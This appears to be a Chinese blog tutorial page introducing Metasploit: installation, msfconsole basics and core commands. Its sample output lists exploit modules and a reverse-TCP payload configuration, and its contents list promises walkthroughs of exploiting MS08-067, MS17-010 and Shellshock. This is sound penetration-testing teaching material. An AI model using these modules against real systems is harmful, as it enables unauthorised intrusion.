<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Safe: 09-信息安全工具使用进阶</title>
<meta name="generator" content="Org Mode" />
<link rel="stylesheet" type="text/css" href="/static/font.css"/>
<link rel="stylesheet" type="text/css" href="/static/drollery.e825b870.css"/>
<link rel="icon" href="/favicon.ico" type="image/x-icon">
<link rel="me" href="https://emacs.ch/@jasperhsu">
<meta name="google-adsense-account" content="ca-pub-1741779893655624">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1741779893655624" crossorigin="anonymous"></script>
</head>
<body>
<header id="preamble" class="status">
<header class="{className}" data-astro-cid-3ef6ksr2>
  <div class=header-branding data-astro-cid-g2lrb5xm>
      <span class=header-text data-astro-cid-g2lrb5xm>
          <span class=dropcap data-astro-cid-g2lrb5xm aria-hidden=true>
              <span class=actual data-astro-cid-g2lrb5xm>J</span>
              <span class=rest data-astro-cid-g2lrb5xm>asper Hsu</span>
              <span class=period data-astro-cid-g2lrb5xm>.</span>
          </span>
          <span class=sr-only data-astro-cid-g2lrb5xm>Drollery</span>
      </span>
      <img alt="Medieval drollery of a knight on a horse" class=spring decoding=async height=250 loading=lazy src=/images/knight-horse.a96eee7d_Z1WCOYs.webp width=68 data-astro-cid-g2lrb5xm>
  </div>

  <nav data-astro-cid-pux6a34n>
      <span class=flower2 data-astro-cid-pux6a34n>M</span>
      <a href=/jcodelog.html class=nobracket data-astro-cid-pux6a34n>技术</a>
      <span class=flower2 data-astro-cid-pux6a34n>K</span>
      <a href=/reading/index.html class=nobracket data-astro-cid-pux6a34n>阅读</a>
      <span class=flower2 data-astro-cid-pux6a34n>J</span>
      <a href=/lisp/jasper-emacs.html class=nobracket data-astro-cid-pux6a34n>我的Emacs配置</a>
      <span class=flower2 data-astro-cid-pux6a34n>L</span>
      <a href=/link/index.html class=nobracket data-astro-cid-pux6a34n>友链</a>
      <span class=flower2 data-astro-cid-pux6a34n>M</span>
      <a href=/about.html class=nobracket data-astro-cid-pux6a34n>关于</a>
      <span class=flower2 data-astro-cid-pux6a34n>J</span>
  </nav>


  <div class="container" data-astro-cid-3ef6ksr2>
    <p class="info" data-astro-cid-3ef6ksr2>
              🏆 欢迎来到本站：
              <a href="https://xuchangwei.com/">https://xuchangwei.com/</a>。
              <strong>希望这里有你感兴趣的内容</strong>。
            </p>
  </div>
  <div id=borderArtWrapper class="tt1" data-astro-cid-5hce7sga data-turbo-permanent>
      <script>
          var man, shakeCount = 0, noSound = new Audio("/audio/effects/no.m4a"), screamSound = new Audio("/audio/effects/scream.m4a");
          function animateManShakeHandler() {
              man.removeEventListener("animationend", animateManShakeHandler, !1),
              shakeCount += 1,
              man.classList.remove("shakeMan")
          }
          function animateManFallHandler() {
              man.removeEventListener("animationend", animateManFallHandler, !1),
              man.classList.add("hide")
          }
          function animateMan() {
              man = man ?? document.getElementById("borderMan"),
              3 === shakeCount ? (man.classList.add("fallMan"),
              screamSound.play(),
              man.addEventListener("animationend", animateManFallHandler, !1)) : (man.classList.add("shakeMan"),
              noSound.play(),
              man.addEventListener("animationend", animateManShakeHandler, !1))
          }
      </script>
      <div class=borderArt data-astro-cid-5dda5nwp id=articleBorder>
          <img alt="flowery border with man falling" decoding=async height=620 loading=lazy src=/images/border-vines-no-man.b7d246cc_DRxSe.webp width=909 class=border data-astro-cid-5dda5nwp>
          <div class=fallWrapper data-astro-cid-5dda5nwp>
              <img alt="flowery border with man falling" decoding=async height=292 loading=lazy src=/images/man-no-vines.247a3187_Z2ioXNM.webp width=98 class=man data-astro-cid-5dda5nwp id=borderMan onclick=animateMan()>
          </div>
      </div>
  </div>
</header>
</header>
<main class="container" id="content" class="content">
<header>
<h1 class="title">Safe: 09-信息安全工具使用进阶</h1>
</header><nav id="table-of-contents" role="doc-toc">
<h2>Table of Contents</h2>
<div id="text-table-of-contents" role="doc-toc">
<ul>
<li><a href="#org4acce86">Kali MSF 基本介绍</a>
<ul>
<li><a href="#orgafcf6cd">Kali MSF</a>
<ul>
<li><a href="#org25d07be">如何使用 MSF</a></li>
<li><a href="#org4d9ebc6">启动 MSFconsole</a></li>
<li><a href="#org7f30a2e">使用 MSFconsole 界面</a></li>
<li><a href="#orgaecb17b">如何使用命令提示符</a></li>
<li><a href="#orgd74e7d5">补全标签</a></li>
</ul>
</li>
<li><a href="#orgfb2777b">MSF console Commands</a>
<ul>
<li><a href="#org4f55887">back</a></li>
<li><a href="#orgbdafff4">banner</a></li>
<li><a href="#org10044be">check</a></li>
<li><a href="#org2b78fa2">color</a></li>
<li><a href="#orgcfbaf61">connect</a></li>
<li><a href="#org6ea2806">exit</a></li>
<li><a href="#org5656e69">grep</a></li>
<li><a href="#org136549b">help</a></li>
<li><a href="#orgf064701">info</a></li>
<li><a href="#orgbc79f43">jobs</a></li>
<li><a href="#org07d64cc">kill</a></li>
<li><a href="#org2188be6">search</a></li>
<li><a href="#org35f4c7d">name</a></li>
<li><a href="#orga21a14c">platform</a></li>
<li><a href="#org649dc1f">type</a></li>
<li><a href="#orgee434c5">author</a></li>
<li><a href="#org2a60fff">multiple</a></li>
<li><a href="#orgcb6936d">sessions</a></li>
<li><a href="#org863dd62">set</a></li>
<li><a href="#org213ff84">unset</a></li>
<li><a href="#org1f44eb5">setg</a></li>
<li><a href="#orgcfeb054">show</a></li>
<li><a href="#orgac8417e">auxiliary</a></li>
<li><a href="#org0304bfc">exploits</a></li>
<li><a href="#orgdf07a76">payloads</a></li>
<li><a href="#org86a2f15">options</a></li>
<li><a href="#org2f8be9b">targets</a></li>
<li><a href="#org15434fa">advanced</a></li>
<li><a href="#orgdfe50ff">encoders</a></li>
<li><a href="#org480e1b0">use</a></li>
<li><a href="#org682dae9">meterpreter 内命令</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#orga64a8af">MSF 漏洞利用</a>
<ul>
<li><a href="#org4e832f9">MS08-067漏洞</a>
<ul>
<li><a href="#org8a7fa78">漏洞利用</a></li>
<li><a href="#orgcbbac8a">使用键盘记录</a></li>
</ul>
</li>
<li><a href="#org03364ca">MS10-018漏洞</a>
<ul>
<li><a href="#org6286d6c">漏洞简介</a></li>
<li><a href="#orge62c95c">漏洞利用</a></li>
</ul>
</li>
<li><a href="#orga27d8d4">MS17-010漏洞</a>
<ul>
<li><a href="#orgc42432b">漏洞简介</a></li>
<li><a href="#orga8f89d7">漏洞利用</a></li>
<li><a href="#org7522fca">扩展内容</a>
<ul>
<li><a href="#orgc415da2">MS17-010漏洞修复</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#orgc742e5e">Bash Shellshock CVE-2014-6271（破壳）</a>
<ul>
<li><a href="#orgd7d10fb">漏洞简介</a></li>
<li><a href="#org9b0c2fa">漏洞原理</a></li>
<li><a href="#org8406b32">漏洞利用</a>
<ul>
<li><a href="#org8728823">环境搭建</a></li>
<li><a href="#orgbb33866">漏洞攻击</a></li>
<li><a href="#org8519b1d">使用msf进行利用</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#org15b6918">远程命令执行漏洞 CVE-2017-8464（震网三代）</a>
<ul>
<li><a href="#org225cf11">漏洞描述</a></li>
<li><a href="#org5735756">影响版本</a></li>
<li><a href="#orgcac44cb">漏洞利用</a></li>
</ul>
</li>
<li><a href="#orgf7f9977">Flash漏洞 CVE-2018-4878</a>
<ul>
<li><a href="#org73ddf3f">漏洞简介</a></li>
<li><a href="#org93815f9">影响版本</a></li>
<li><a href="#orgc5f0e01">漏洞利用</a>
<ul>
<li><a href="#org24596df">漏洞环境</a></li>
<li><a href="#org247420a">攻击流程</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#org9ceb3fe">MSF攻击流程总结</a></li>
</ul>
</li>
</ul>
</div>
</nav>
<ul class="org-ul">
<li>TAGS: <a href="../../index.html">Safe</a><br></li>
</ul>
<section id="outline-container-org4acce86" class="outline-2">
<h2 id="org4acce86">Kali MSF 基本介绍</h2>
<div class="outline-text-2" id="text-org4acce86">
<p>
主要内容：<br>
</p>
<ul class="org-ul">
<li>Kaili 问题解答与 MSF 知识<br></li>
<li>MSF 基本命令<br></li>
<li>MSF console Commands<br></li>
</ul>
</div>
<div id="outline-container-orgafcf6cd" class="outline-3">
<h3 id="orgafcf6cd">Kali MSF</h3>
<div class="outline-text-3" id="text-orgafcf6cd">
<p>
The Metasploit Framework（简称metasploit），它是一款开源的安全漏洞利用和测试工具，也是目前最流行、最强大、最具扩展性的渗透测试框架之一。集成了各种平台上常见的漏洞和流行的shellcode，并持续保持更新。拥有世界上最大的渗透测试攻击数据库，可以利用其现有的payload进行一系列的渗透测试。<br>
</p>

<p>
官方网站：<a href="https://www.metasploit.com/">https://www.metasploit.com/</a><br>
github 地址：<a href="https://github.com/rapid7/metasploit-framework">https://github.com/rapid7/metasploit-framework</a><br>
</p>
</div>
<div id="outline-container-org25d07be" class="outline-4">
<h4 id="org25d07be">如何使用 MSF</h4>
<div class="outline-text-4" id="text-org25d07be">
<p>
MSFconsole是使用Metasploit框架（MSF）的最常用的接口，通过该接口可以实现对MSF的控制和使用。它提供了一个“一体式”集中式控制台，并允许访问 MSF 中几乎所有可用的选项。<br>
</p>

<p>
Installing Metasploit on Linux / macOS<br>
</p>

<p>
方法1：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; <span style="color: #8b2252;">\</span>
  chmod 755 msfinstall &amp;&amp; <span style="color: #8b2252;">\</span>
  ./msfinstall
</pre>
</div>

<p>
方法2：<br>
首先下载pkg文件：<br>
<a href="http://osx.metasploit.com/metasploitframework-latest.pkg">http://osx.metasploit.com/metasploitframework-latest.pkg</a><br>
双击安装<br>
</p>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">cd</span> /opt/metasploit-framework/bin/
</pre>
</div>

<p>
切换到普通用户，运行命令以开始初始设置<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">$ msfdb init
Clearing http web data service credentials<span style="color: #a020f0;"> in</span> msfconsole
Running the <span style="color: #8b2252;">'init'</span> command for the database:
Creating database at /home/jasper/.msf4/db
Creating db socket file at /tmp
Starting database at /home/jasper/.msf4/db...success
Creating database users
Writing client authentication configuration file /home/jasper/.msf4/db/pg_hba.conf
Stopping database at /home/jasper/.msf4/db
Starting database at /home/jasper/.msf4/db...success
Creating initial database schema
Database initialization successful

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#26816;&#26597;&#26694;&#26550;&#29256;&#26412;</span>
$ msfconsole --version
Framework Version: 6.3.27-dev-

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#21551;&#21160;</span>
$ msfconsole


                 _---------.
             <span style="color: #483d8b;">.</span><span style="color: #8b2252;">' #######   ;."</span>
<span style="color: #8b2252;">  .---,.    ;@             @@`;   .---,..</span>
<span style="color: #8b2252;">." @@@@@'</span>.,<span style="color: #8b2252;">'@@            @@@@@'</span>,.<span style="color: #8b2252;">'@@@@ ".</span>
<span style="color: #8b2252;">'</span>-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   <span style="color: #ff00ff;">`.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'</span>
<span style="color: #ff00ff;">     "--'.@@@  -.@        @ ,'-   .'--"</span>
<span style="color: #ff00ff;">          ".@' ; @       @ `</span><span style="color: #483d8b;">.</span>  ;<span style="color: #8b2252;">'</span>
<span style="color: #8b2252;">            |@@@@ @@@     @    .</span>
<span style="color: #8b2252;">             '</span> @@@ @@   @@    ,
              <span style="color: #ff00ff;">`.@@@@    @@   .</span>
<span style="color: #ff00ff;">                ',@@     @   ;           _____________</span>
<span style="color: #ff00ff;">                 (   3 C    )     /|___ / Metasploit! \</span>
<span style="color: #ff00ff;">                 ;@'. __*__,."    \|--- \_____________/</span>
<span style="color: #ff00ff;">                  '(.,...."/</span>


<span style="color: #ff00ff;">       =[ metasploit v6.3.27-dev-                         ]</span>
<span style="color: #ff00ff;">+ -- --=[ 2333 exploits - 1220 auxiliary - 413 post       ]</span>
<span style="color: #ff00ff;">+ -- --=[ 1382 payloads - 46 encoders - 11 nops           ]</span>
<span style="color: #ff00ff;">+ -- --=[ 9 evasion                                       ]</span>

<span style="color: #ff00ff;">Metasploit tip: Save the current environment with the</span>
<span style="color: #ff00ff;">save command, future console restarts will use this</span>
<span style="color: #ff00ff;">environment again</span>
<span style="color: #ff00ff;">Metasploit Documentation: https://docs.metasploit.com/</span>

<span style="color: #ff00ff;">msf6 &gt;</span>

<span style="color: #ff00ff;"># &#26356;&#26032; Metasploit &#26694;&#26550;</span>
<span style="color: #ff00ff;">$ msfupdate</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-org4d9ebc6" class="outline-4">
<h4 id="org4d9ebc6">启动 MSFconsole</h4>
<div class="outline-text-4" id="text-org4d9ebc6">
<p>
在Kali系统的命令行中输入 msfconsole 即可启动。MSFconsole 位于 /usr/share/metasploit-framework/msfconsole 目录中。<br>
</p>

<p>
加 -q 选项删除开始的图形，是 msfconsole 的安静启动模式。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">root@kali:# msfconsole -q
msf &gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-org7f30a2e" class="outline-4">
<h4 id="org7f30a2e">使用 MSFconsole 界面</h4>
<div class="outline-text-4" id="text-org7f30a2e">

<figure id="orgb70326d">
<img src="./images/img_20230726_140619.png" alt="img_20230726_140619.png" width="60%"><br>

</figure>
</div>
</div>
<div id="outline-container-orgaecb17b" class="outline-4">
<h4 id="orgaecb17b">如何使用命令提示符</h4>
<div class="outline-text-4" id="text-orgaecb17b">
<p>
可以传递 -h 给 msfconsole 以查看其他可用的使用选项。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msfconsole -h
</pre>
</div>

<p>
也可以进入 msf 环境中，使用 help 命令的列出帮助信息。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msf &gt; help
</pre>
</div>
</div>
</div>
<div id="outline-container-orgd74e7d5" class="outline-4">
<h4 id="orgd74e7d5">补全标签</h4>
<div class="outline-text-4" id="text-orgd74e7d5">
<p>
MSFconsole 旨在快速使用MSF，由于可用的模块种类繁多，因此可能很难记住我们希望使用的特定模块的确切名称和路径。<br>
</p>

<p>
与大多数其他 shell 一样，输入我们知道的内容并按“Tab”键将显示可用选项列表，如果只有一个选项，则自动补全字符串。<br>
</p>

<p>
Tab 补全取决于 ruby readline 扩展，并且控制台中的几乎每个命令都支持 Tab 补全。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">use exploit/windows/dcerpc
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">msf6 &gt; use exploit/windows/smb/ms
use exploit/windows/smb/ms03_049_netapi                     use exploit/windows/smb/ms06_040_netapi                     use exploit/windows/smb/ms10_046_shortcut_icon_dllloader
use exploit/windows/smb/ms04_007_killbill                   use exploit/windows/smb/ms06_066_nwapi                      use exploit/windows/smb/ms10_061_spoolss
use exploit/windows/smb/ms04_011_lsass                      use exploit/windows/smb/ms06_066_nwwks                      use exploit/windows/smb/ms15_020_shortcut_icon_dllloader
use exploit/windows/smb/ms04_031_netdde                     use exploit/windows/smb/ms06_070_wkssvc                     use exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/smb/ms05_039_pnp                        use exploit/windows/smb/ms07_029_msdns_zonename             use exploit/windows/smb/ms17_010_psexec
use exploit/windows/smb/ms06_025_rasmans_reg                use exploit/windows/smb/ms08_067_netapi
use exploit/windows/smb/ms06_025_rras                       use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
</pre>
</div>

<p>
exploit 是 Metasploit 最常用的接口。时间有限，不可能展示exploit下的所有漏洞利用模块，所以会挑一些典型的漏洞进行讲解。学会了典型漏洞的利用方式之后，其他的漏洞利用模块都可以按照同样的步骤去学习使用，大同小异。<br>
</p>
</div>
</div>
</div>
<div id="outline-container-orgfb2777b" class="outline-3">
<h3 id="orgfb2777b">MSF console Commands</h3>
<div class="outline-text-3" id="text-orgfb2777b">
<p>
MSFconsole 有许多不同的命令选项可供选择，以下是参考其输出的一组核心 Metasploit 命令。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">Core Commands
=============

    Command       Description
    -------       -----------
    banner        Display an awesome metasploit banner
    <span style="color: #483d8b;">cd</span>            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    <span style="color: #a020f0;">exit</span>          Exit the console
    get           Gets the value of a context-specific variable
    getg          Gets the value of a global variable
    grep          Grep the output of another command
    <span style="color: #483d8b;">help</span>          Help menu
    load          Load a framework plugin
    quit          Exit the console
    route         Route traffic through a session
    save          Saves the active datastores
    sessions      Dump session listings and display information about sessions
    <span style="color: #483d8b;">set</span>           Sets a context-specific variable to a value
    setg          Sets a global variable to a value
    sleep         Do nothing for the specified number of seconds
    spool         Write console output into a file as well the screen
    threads       View and manipulate background threads
    unload        Unload a framework plugin
    <span style="color: #483d8b;">unset</span>         Unsets one or more context-specific variables
    unsetg        Unsets one or more global variables
    version       Show the framework and console library version numbers


Module Commands
===============

    Command       Description
    -------       -----------
    back          Move back from the current context
    info          Displays information about one or more modules
    loadpath      Searches for and loads modules from a path
    popm          Pops the latest module off the stack and makes it active
    previous      Sets the previously loaded module as the current module
    pushm         Pushes the active or list of modules onto the module stack
    reload_all    Reloads all modules from all defined module paths
    search        Searches module names and descriptions
    use           Interact with a module by name or search term/index
 Job Commands
============

    Command       Description
    -------       -----------
    <span style="color: #483d8b;">jobs</span>          Displays and manages jobs
    <span style="color: #483d8b;">kill</span>          Kill a job
    rename_job    Rename a job


Resource Script Commands
========================

    Command       Description
    -------       -----------
    makerc        Save commands entered since start to a file
    resource      Run the commands stored<span style="color: #a020f0;"> in</span> a file


Database Backend Commands
=========================

    Command       Description
    -------       -----------
    workspace     Switch between database workspaces

Developer Commands
==================

    Command       Description
    -------       -----------
    edit          Edit the current module or a file with the preferred editor
    irb           Open an interactive Ruby shell<span style="color: #a020f0;"> in</span> the current context
</pre>
</div>
</div>
<div id="outline-container-org4f55887" class="outline-4">
<h4 id="org4f55887">back</h4>
<div class="outline-text-4" id="text-org4f55887">
<p>
一旦完成了特定模块的工作，或者如果无意中选择了错误的模块，可以发出 back 命令返回前一个命令行。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">msf auxiliary(ms09_001_write) &gt; back
msf &gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-orgbdafff4" class="outline-4">
<h4 id="orgbdafff4">banner</h4>
<div class="outline-text-4" id="text-orgbdafff4">
<p>
显示 banner 信息<br>
收录漏洞数、<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">msf6 &gt; banner
<span style="color: #b22222;"># </span><span style="color: #b22222;">cowsay++</span>
 ____________
&lt; metasploit &gt;
 ------------
       <span style="color: #8b2252;">\ </span>  ,__,
        <span style="color: #8b2252;">\ </span> (oo)____
           (__)    )<span style="color: #8b2252;">\</span>
              ||--|| *


       =[ metasploit v6.3.27-dev-                         ]
+ -- --=[ 2333 exploits - 1220 auxiliary - 413 post       ]
+ -- --=[ 1382 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Save the current environment with the
save command, future console restarts will use this
environment again
Metasploit Documentation: https://docs.metasploit.com/
</pre>
</div>

<p>
2333 exploits - 1220 auxiliary - 413 post ： 收录 2333 个漏洞模块、1171 辅助模块、413 个后渗透攻击<br>
1382 payloads - 46 encoders - 11 nops：1382 个目标位置可执行指令、46 个加密模块，可以做免疫杀毒<br>
</p>
</div>
</div>
<div id="outline-container-org10044be" class="outline-4">
<h4 id="org10044be">check</h4>
<div class="outline-text-4" id="text-org10044be">
<p>
<b>漏洞检查</b> 选项，可以检查目标是否容易受到特定漏洞的攻击，而不是实际利用它。需要注意的是，支持check的漏洞利用模块并不多。<br>
</p>

<div class="org-src-container">
<pre class="src src-sh">msf6 &gt; search ms08
msf6 &gt; use 0
msf6 &gt; info
... ...
Check supported:
  Yes    &#35828;&#26126;&#25903;&#25345;Check&#27169;&#22359;
...



msf6 exploit(windows/smb/ms08_067_netapi) &gt; show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: <span style="color: #8b2252;">''</span>, seh, thread, process, none)
   LHOST     10.0.4.12        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting



View the full module info with the info, or info -d command.

msf exploit(ms08_067_netapi) &gt; check
[*] Verifying vulnerable status... (path: 0x0000005a)
[*] System is not vulnerable (status: 0x00000000)
[*] The target is not exploitable.
</pre>
</div>
</div>
</div>
<div id="outline-container-org2b78fa2" class="outline-4">
<h4 id="org2b78fa2">color</h4>
<div class="outline-text-4" id="text-org2b78fa2">
<p>
命令行字符设置是否展示颜色，可以搭配banner进行尝试。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msf6 &gt; color
Usage: color &lt;<span style="color: #8b2252;">'true'</span>|<span style="color: #8b2252;">'false'</span>|<span style="color: #8b2252;">'auto'</span>&gt;

Enable or disable color output.
</pre>
</div>
</div>
</div>
<div id="outline-container-orgcfbaf61" class="outline-4">
<h4 id="orgcfbaf61">connect</h4>
<div class="outline-text-4" id="text-orgcfbaf61">
<p>
msfconsole 中内置了一个微型 Netcat ，支持 SSL、代理和文件传输。通过发出的 connect 带有 IP 地址和端口号命令，可以从 msfconsole 中连接到远程主机，就像使用 Netcat 或 Telnet 一样。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msf &gt; connect 192.168.1.1 23
[*] Connected to 192.168.1.1:23
DD-WRT v24 std (c) 2008 NewMedia-NET GmbH
Release: 07/27/08 (SVN revision: 10011)
DD-WRT login:
</pre>
</div>

<p>
可以通过 -h 来查看所有附加选项参数。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msf6 &gt; connect -h
Usage: connect [options] &lt;host&gt; &lt;port&gt;

Communicate with a host, similar to interacting via netcat, taking advantage of
any configured session pivoting.

OPTIONS:

    -c, --comm &lt;comm&gt;               Specify which Comm to use.
    -C, --crlf                      Try to use CRLF for EOL sequence.
    -h, --help                      Help banner.
    -i, --send-contents &lt;file&gt;      Send the contents of a file.
    -p, --proxies &lt;proxies&gt;         List of proxies to use.
    -P, --source-port &lt;port&gt;        Specify source port.
    -S, --source-address &lt;address&gt;  Specify source address.
    -s, --ssl                       Connect with SSL.
    -u, --udp                       Switch to a UDP socket.
    -w, --timeout &lt;seconds&gt;         Specify connect timeout.
    -z, --try-connection            Just try to connect, then return.
</pre>
</div>
</div>
</div>
<div id="outline-container-org6ea2806" class="outline-4">
<h4 id="org6ea2806">exit</h4>
<div class="outline-text-4" id="text-org6ea2806">
<p>
退出 msfconsole.<br>
</p>
</div>
</div>
<div id="outline-container-org5656e69" class="outline-4">
<h4 id="org5656e69">grep</h4>
<div class="outline-text-4" id="text-org5656e69">
<p>
该 grep 的命令类似的Linux的grep。它匹配来自另一个 msfconsole 命令的输出内容。<br>
</p>

<p>
以下是使用的示例， grep 匹配包含字符串“http”的输出，该输出来自 搜索 包含字符串“oracle”的模块。<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msf6 &gt; grep
Usage: grep [OPTIONS] [--] PATTERN CMD...
Grep the results of a console command (similar to Linux grep command)

    -m, --max-count num              Stop after num matches.
    -A, --after-context num          Show num lines of output after a match.
    -B, --before-context num         Show num lines of output before a match.
    -C, --context num                Show num lines of output around a match.
    -v, --[no-]invert-match          Invert match.
    -i, --[no-]ignore-case           Ignore case.
    -c, --count                      Only print a count of matching lines.
    -k, --keep-header num            Keep (include) num lines at start of output
    -s, --skip-header num            Skip num lines of output before attempting match.
    -h, --help                       Help banner.
        --generate-completions str   Return possible tab completions for given string.
msf6 &gt;
msf6 &gt; grep http search oracle
   0    exploit/windows/http/apache_chunked                                   2002-06-19       good       Yes    Apache Win32 Chunked Encoding
   24   exploit/windows/http/oracle9i_xdb_pass                                2003-08-18       great      Yes    Oracle 9i XDB HTTP PASS Overflow (win32)
   25   exploit/multi/http/oracle_ats_file_upload                             2016-01-20       excellent  Yes    Oracle ATS Arbitrary File Upload
   29   exploit/windows/http/oats_weblogic_console                            2019-03-13       excellent  Yes    Oracle Application Testing Suite WebLogic Server Administration Console War Deployment
   31   exploit/windows/http/oracle_beehive_prepareaudiotoplay                2015-11-10       excellent  Yes    Oracle BeeHive 2 voice-servlet prepareAudioToPlay() Arbitrary File Upload
   32   exploit/windows/http/oracle_beehive_evaluation                        2010-06-09       excellent  Yes    Oracle BeeHive 2 voice-servlet processEvaluation() Vulnerability
   33   exploit/windows/http/oracle_btm_writetofile                           2012-08-07       excellent  No     Oracle Business Transaction Management FlashTunnelService Remote Code Execution
   54   auxiliary/scanner/http/oracle_demantra_file_retrieval                 2014-02-28       normal     No     Oracle Demantra Arbitrary File Retrieval with Authentication Bypass
   55   auxiliary/scanner/http/oracle_demantra_database_credentials_leak      2014-02-28       normal     No     Oracle Demantra Database Credentials Leak
   57   exploit/linux/http/oracle_ebs_rce_cve_2022_21587                      2022-10-01       excellent  Yes    Oracle E-Business Suite (EBS) Unauthenticated Arbitrary File Upload
   58   exploit/windows/http/oracle_endeca_exec                               2013-07-16       excellent  Yes    Oracle Endeca Server Remote Command Execution
   60   exploit/windows/http/oracle_event_processing_upload                   2014-04-21       excellent  Yes    Oracle Event Processing FileUploadServlet Arbitrary File Upload
   61   exploit/multi/http/oracle_reports_rce                                 2014-01-15       great      Yes    Oracle Forms and Reports Remote Code Execution
   62   auxiliary/scanner/http/oracle_ilom_login                                               normal     No     Oracle ILO Manager Login Brute Force Utility
   74   exploit/windows/http/osb_uname_jlist                                  2010-07-13       excellent  No     Oracle Secure Backup Authentication Bypass/Command Injection Vulnerability
   87   exploit/multi/http/weblogic_admin_handle_rce                          2020-10-20       excellent  Yes    Oracle WebLogic Server Administration Console Handle RCE
   88   exploit/multi/http/oracle_weblogic_wsat_deserialization_rce           2017-10-19       excellent  No     Oracle WebLogic wls-wsat Component Deserialization RCE
   89   exploit/windows/http/bea_weblogic_post_bof                            2008-07-17       great      Yes    Oracle Weblogic Apache Connector POST Request Buffer Overflow
   101  auxiliary/scanner/http/glassfish_traversal                            2015-08-08       normal     No     Path Traversal<span style="color: #a020f0;"> in</span> Oracle GlassFish Server Open Source Edition
   112  exploit/multi/http/glassfish_deployer                                 2011-08-04       excellent  No     Sun/Oracle GlassFish Server Authenticated Code Execution
</pre>
</div>


<p>
查询 oracle 漏洞利用模块，过滤包含 weblogic 组件的信息<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">msf6 &gt; grep weblogic search oracle
</pre>
</div>
</div>
</div>
<div id="outline-container-org136549b" class="outline-4">
<h4 id="org136549b">help</h4>
<div class="outline-text-4" id="text-org136549b">
<p>
列出帮助list和所有可用的命令.<br>
</p>
</div>
</div>
<div id="outline-container-orgf064701" class="outline-4">
<h4 id="orgf064701">info</h4>
<div class="outline-text-4" id="text-orgf064701">
<p>
信息 命令会提供包括所有选项、目标和其它信息的特定漏洞利用模块的详细信息。<br>
</p>

<p>
info 命令还提供以下信息：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#20316;&#32773;&#21644;&#35768;&#21487;&#20449;&#24687;
&#28431;&#27934;&#21442;&#32771;&#65288;&#21363;&#65306;CVE&#12289;BID &#31561;&#65289;
&#27169;&#22359;&#21487;&#33021;&#20855;&#26377;&#30340;&#20219;&#20309;&#26377;&#25928;&#36733;&#33655;&#38480;&#21046;
</pre>
</div>

<div class="org-src-container">
<pre class="src src-sh">msf6 &gt; use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; info

       Name: MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
     Module: exploit/windows/smb/ms09_050_smb2_negotiate_func_index
   Platform: Windows
       Arch:
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Good
  Disclosed: 2009-09-07


Provided by:
  Laurent Gaffie <a href="mailto:laurent.gaffie%40gmail.com">&lt;laurent.gaffie@gmail.com&gt;</a>
  hdm <a href="mailto:x%40hdm.io">&lt;x@hdm.io&gt;</a>
  sf <a href="mailto:stephen_fewer%40harmonysecurity.com">&lt;stephen_fewer@harmonysecurity.com&gt;</a>

Available targets:
      Id  Name
      --  ----
  =&gt;  0   Windows Vista SP1/SP2 and Server 2008 (x86)

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit
                                     /basics/using-metasploit.html
  RPORT   445              yes       The target port (TCP)
  WAIT    180              yes       The number of seconds to wait for the attack to complete.

Payload information:
  Space: 1024

Description:
  This module exploits an out of bounds <span style="color: #a020f0;">function</span> <span style="color: #0000ff;">table</span> dereference<span style="color: #a020f0;"> in</span> the SMB
  request validation code of the SRV2.SYS driver included with Windows Vista, Windows 7
  release candidates (not RTM), and Windows 2008 Server prior to R2. Windows Vista
  without SP1 does not seem affected by this flaw.

References:
